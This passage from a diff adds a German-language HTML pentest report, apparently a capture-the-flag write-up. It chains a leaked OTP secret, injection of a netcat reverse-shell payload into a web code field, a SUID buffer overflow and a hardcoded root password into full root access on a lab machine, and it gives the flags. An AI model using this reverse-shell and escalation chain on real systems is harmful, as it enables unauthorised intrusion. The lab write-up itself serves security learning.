+            <p class="analysis"><strong>Schwachstellen:</strong> Hartkodiertes Google Authenticator Secret, unsichere Code-Ausführung (`eval`/`exec`?) in `coder.php`.</p>
+            <p class="analysis"><strong>Schritte:</strong></p>
+            <ol>
+                <li>Finde Secret `S4I22IG3KHZIGQCJ` und PHP-Dateien in `/includes/php/`.</li>
+                <li>Generiere gültigen OTP-Code mit `access.php` (lokal oder via LFI).</li>
+                <li>Gib OTP auf Webseite ein, um zu `coder.php` zu gelangen.</li>
+                <li>Injiziere Python-Reverse-Shell-Payload (z.B. `__import__('os').system('nc ... -e /bin/bash')`) in das Code-Eingabefeld.</li>
+                <li>Starte Netcat-Listener (`nc -lvnp 9001`).</li>
+            </ol>
+            <p class="analysis"><strong>Ergebnis:</strong> Reverse Shell als `www-data`.</p>
+
+            <h3>POC Schritt 2: Privilege Escalation (www-data zu learner via SUID Exploit)</h3>
+            <p class="analysis"><strong>Schwachstelle:</strong> SUID/SGID Binary `/usr/bin/MakeMeLearner` mit Buffer Overflow oder ähnlicher Schwachstelle.</p>
+            <p class="analysis"><strong>Voraussetzungen:</strong> Shell als `www-data`.</p>
+            <p class="analysis"><strong>Schritte:</strong></p>
+            <ol>
+                <li>Finde SUID-Binary `/usr/bin/MakeMeLearner`.</li>
+                <li>Führe Binary mit langem Argument aus: `MakeMeLearner $(python3 -c 'print("A"*100)')` (genauer Payload ggf. anzupassen).</li>
+            </ol>
+            <p class="analysis"><strong>Ergebnis:</strong> Effektive UID wechselt zu `learner` (UID 1000).</p>
+
+            <h3>POC Schritt 3: Privilege Escalation (learner zu root via Password Leak)</h3>
+            <p class="analysis"><strong>Schwachstelle:</strong> Hartkodiertes Root-Passwort in `/home/learner/MySecretPasswordVault`.</p>
+            <p class="analysis"><strong>Voraussetzungen:</strong> Shell als `learner`.</p>
+            <p class="analysis"><strong>Schritte:</strong></p>
+            <ol>
+                <li>Lade `/home/learner/MySecretPasswordVault` auf Angreifer-System herunter.</li>
+                <li>Analysiere Binary mit IDA Pro oder `strings` und finde Passwort `NI98hIhj)(Jj`.</li>
+                <li>Wechsle zu Root: `su root` (Passwort eingeben).</li>
+            </ol>
+            <p class="analysis"><strong>Ergebnis:</strong> Root-Shell.</p>
+            <p class="analysis"><strong>Beweismittel:</strong> Erfolgreicher `su`-Befehl, Lesen von `/root/root.txt` möglich.</p>
+
+            <p class="evaluation"><strong>Risikobewertung:</strong> Sehr hoch. Eine Kombination aus Informationsleck (OTP Secret), Web-RCE, einer SUID-Schwachstelle und einem hartkodierten Root-Passwort ermöglicht die vollständige Kompromittierung.</p>
+            <p class="recommendation"><strong>Empfehlungen:**
+*   **Admin:** Secrets nicht hartkodieren. Unsichere Code-Ausführung im Web beheben. SUID-Binary `MakeMeLearner` patchen/entfernen. Hartkodiertes Passwort aus `MySecretPasswordVault` entfernen und sichere Authentifizierung implementieren.
+*   **Pentester:** Die einzelnen Eskalationsstufen und Schwachstellen klar dokumentieren.</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/learner/user.txt</div>
+                     <div class="flag-value"><span class="password">N1c3m0veMat3!</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">Y0uG0TitbR0!</span></div>
+                 </div>
+             </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 19. Oktober 2022</p> <!-- Datum angepasst -->
+    </footer>
+</body>
+</html>
